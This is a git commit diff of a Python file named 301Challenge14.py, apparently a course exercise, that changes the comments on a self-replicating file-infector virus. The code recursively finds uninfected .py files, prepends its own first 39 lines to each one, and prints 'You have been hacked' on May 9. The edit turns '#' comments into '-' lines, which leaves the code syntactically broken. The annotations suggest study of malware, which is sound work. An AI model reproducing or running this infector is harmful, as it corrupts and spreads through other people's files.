bb3c6b547123059f46da155894b40115a0aa6596
christen-reinhart <christen.reinhart@yahoo.com>
2023-12-14 21:31:08 -0500

    Malware1

--- 301Challenge14.py
+++ 301Challenge14.py
@@ -12,11 +12,11 @@ SIGNATURE = "VIRUS"
 -This defines a variable SIGNATURE  with the vale VIRUS
 
 def locate(path):
-    files_targeted = []   # Initialize a empty list of files to be targeted
-    filelist = os.listdir(path)   # Get a list of files in current directory
+    files_targeted = []   -Initialize a empty list of files to be targeted
+    filelist = os.listdir(path)   -Get a list of files in current directory
     for fname in filelist:
         if os.path.isdir(path+"/"+fname):
-            files_targeted.extend(locate(path+"/"+fname))   # Recursive call for subdirectories
+            files_targeted.extend(locate(path+"/"+fname))   -Recursive call for subdirectories
         elif fname[-3:] == ".py":
             infected = False
             for line in open(path+"/"+fname):
@@ -24,9 +24,9 @@ def locate(path):
                     infected = True
                     break
             if infected == False:
-# Check if file is infected 
+-Check if file is infected 
 
-                files_targeted.append(path+"/"+fname)  # Add uninfected files to the list
+                files_targeted.append(path+"/"+fname)  - Add uninfected files to the list
     return files_targeted
 
 -This function scans for virus-free Python files in a directory and its subfolders, adding clean files to a list.
@@ -34,7 +34,7 @@ def locate(path):
 
 
 def infect(files_targeted):
-# This function infects files by prepending the code
+-This function infects files by prepending the code
 
     virus = open(os.path.abspath(__file__))
     virusstring = ""
@@ -42,7 +42,7 @@ def infect(files_targeted):
         if 0 <= i < 39:
             virusstring += line
     Virus.close
-# Read the first 39 lines of the code and store it
+-Read the first 39 lines of the code and store it
 
     for fname in files_targeted:
         f = open(fname)
@@ -51,28 +51,28 @@ def infect(files_targeted):
         f = open(fname,"w")
         f.write(virusstring + temp)
         f.close()
-# Prepend the code to trigger each file
+- Prepend the code to trigger each file
 
 -This function acts as a virus propagation tool. It reads the first 39 lines of the current script as the virus payload, then loops through a list of victim files, injecting the payload at the beginning of each file, effectively compromising their functionality.
 
 
 def detonate():
-# This function contains a payload that triggers on the date
+-This function contains a payload that triggers on the date
    
  if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
         print("You have been hacked")
-# If it is May 9th print the associated message
+-If it is May 9th print the associated message
 
 -This function verifies whether a certain date (May 9th) has arrived. If it has, it delivers a pre-determined message ("You have been hacked").
 
 
 files_targeted = locate(os.path.abspath(""))
-# Locate Python files in directory and subdirectory
+-Locate Python files in directory and subdirectory
 infect(files_targeted)
-# Infect the located files
+-Infect the located files
 
 detonate()
-# Checks if the payload should be triggered and prints a message if the condition is met.
+-Checks if the payload should be triggered and prints a message if the condition is met.
 
 -This script automates a series of actions: identifying Python files, modifying their content, and triggering a specific function based on a predefined condition.
 
